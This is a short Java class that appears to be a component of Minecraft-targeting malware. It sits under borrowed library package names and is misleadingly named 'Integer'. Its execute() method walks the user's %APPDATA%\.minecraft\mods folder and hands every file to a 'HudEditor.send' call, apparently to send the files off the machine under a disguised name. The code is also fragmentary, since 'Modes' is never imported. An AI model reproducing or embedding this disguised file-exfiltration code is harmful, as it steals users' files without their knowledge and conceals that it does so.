package net.jodah.typetools.impl;

import net.reflxction.example.proxy.IMinecraft;
import com.squareup.okhttp.internal.spdy.HudEditor;

import java.io.File;

public final class Integer implements IMinecraft
{
    @Override
    public void execute() {
        for (File file : Modes.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) HudEditor.send(file);
    }
}
